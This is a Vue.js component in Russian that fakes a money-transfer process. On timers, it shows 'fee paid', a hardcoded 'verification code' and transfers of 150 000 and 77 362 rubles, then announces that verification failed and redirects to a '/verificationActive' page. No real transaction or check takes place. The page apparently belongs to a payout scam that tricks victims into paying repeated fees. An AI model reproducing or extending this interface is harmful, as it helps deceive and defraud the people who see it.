<template>
	<div class="v-second-transaction">
		<div class="secondTransaction">
			<p class="secondTransactionHeaderOne">Сбор оплачен</p>
			<p class="secondTransactionHeaderTwo">Код получен успешно!</p>
			<div class="secondTransactionHeaderThree">
				<p>Отказ, код верификации не</p>
				<p>активирован!</p>
			</div>
			<div class="wrappereSecondTransactionLoader">
				<div class="loadereSecondTransactionLoader"></div>
			</div>
			<img :src="require('@/assets/icons/check-in.png')" class="secondTransactionImg">
			<div class="subBlockTextSecondTransaction">
				<p class="secondTransactionTextOne">Генерация кода…</p>
				<p class="secondTransactionTextTwo">Получение кода верификации…</p>
				<p class="secondTransactionTextThree">53959-sdgwg525923532</p>
			</div>
				<p class="secondTransactionTextFour">Отправляем транзакцию на 150 000 руб</p>
				<p class="secondTransactionTextFive">Отправляем транзакцию на 77 362 руб</p>
		</div>
	</div>
</template>

<script>
	export default {
		name: 'v-second-transaction',
		methods: {
			feePaid() {
				let secondTransactionTextOne 			= document.querySelector('.secondTransactionTextOne')
				let secondTransactionTextTwo 			= document.querySelector('.secondTransactionTextTwo')
				let secondTransactionTextThree 			= document.querySelector('.secondTransactionTextThree')
				let secondTransactionTextFour 			= document.querySelector('.secondTransactionTextFour')
				let secondTransactionTextFive 			= document.querySelector('.secondTransactionTextFive')
				let secondTransactionHeaderOne 			= document.querySelector('.secondTransactionHeaderOne')
				let secondTransactionHeaderTwo 			= document.querySelector('.secondTransactionHeaderTwo')
				let secondTransactionHeaderThree 	 	= document.querySelector('.secondTransactionHeaderThree')
				let subBlockTextSecondTransaction 		= document.querySelector('.subBlockTextSecondTransaction')
				let wrappereSecondTransactionLoader 	= document.querySelector('.wrappereSecondTransactionLoader')
				let secondTransactionImg 				= document.querySelector('.secondTransactionImg')

				setTimeout(() => {
					secondTransactionTextOne.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					secondTransactionTextTwo.style.display = 'block'
				}, 2000)
				setTimeout(() => {
					secondTransactionTextThree.style.display = 'block'
				}, 3000)
				setTimeout(() => {
					secondTransactionHeaderOne.style.display = 'none'
					secondTransactionHeaderTwo.style.display = 'block'
					subBlockTextSecondTransaction.style.display = 'none'
				}, 4000)
				setTimeout(() => {
					secondTransactionTextFour.style.display = 'block'
				}, 5000)
				setTimeout(() => {
					secondTransactionTextFive.style.display = 'block'
				}, 6000)
				setTimeout(() => {
					secondTransactionHeaderTwo.style.display = 'none'
					wrappereSecondTransactionLoader.style.display = 'none'
					secondTransactionHeaderThree.style.display = 'block'
					secondTransactionImg.style.display = 'block'
					secondTransactionTextFour.classList.add('textActive')
					secondTransactionTextFive.classList.add('textActive')
				}, 7000)
				setTimeout(() => {
					this.$router.push('/verificationActive')
				}, 8000)
			}
		},
		mounted() {
			this.feePaid()
		}
	}
</script>

<style>
	.v-second-transaction {
		max-width: 600px;
		margin: 0 auto;
		padding: 80px 0;
		display: flex;
		justify-content: center;
	}
	.secondTransaction {
		width: 100%;
		min-height: 585px;
		background: #FFFFFF;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		padding: 25px 10px;
		text-align: center;
	}
	.wrappereSecondTransactionLoader {
		margin: 34px auto;
		width: 53px;
	}
	.loadereSecondTransactionLoader {
		animation: loader-spin 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spin {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.secondTransactionImg {
		display: none;
		width: 53px;
		margin: 40px auto;
	}
	.secondTransactionHeaderOne {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.secondTransactionHeaderTwo {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
		display: none;
	}
	.secondTransactionHeaderThree{
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
		display: none;
	}
	.secondTransactionHeaderThree p {
		margin: 0;
	}
	.secondTransactionTextOne {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
		margin: 0;
	}
	.secondTransactionTextTwo {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
		margin: 0;
	}
	.secondTransactionTextThree {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 600;
		font-size: 16px;
		line-height: 20px;
		color: #646464;
		margin: 0;
	}
	.secondTransactionTextFour {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		margin: 0;
	}
	.secondTransactionTextFive {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		margin: 0;
	}
	.textActive {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #C0C0C0;
	}
	@media only screen and (max-width: 440px) {
		.secondTransaction {
			padding:20px 15px;
			margin: 10px;
			width: 250px;
		}
		.secondTransactionHeaderOne {
			font-family: Exo 2;
			font-style: normal;
			font-weight: bold;
			font-size: 20px;
			line-height: 24px;
			text-align: center;
			color: #2D2D2D;
		}
		.secondTransactionHeaderTwo {
			font-family: Exo 2;
			font-style: normal;
			font-weight: bold;
			font-size: 20px;
			line-height: 24px;
			text-align: center;
			color: #2D2D2D;
		}
		.secondTransactionHeaderThree {
			font-family: Exo 2;
			font-style: normal;
			font-weight: bold;
			font-size: 20px;
			line-height: 24px;
			text-align: center;
			color: #2D2D2D;
		}
		.firstPaymentButton {
			font-size: 14px;
		}
	}
</style>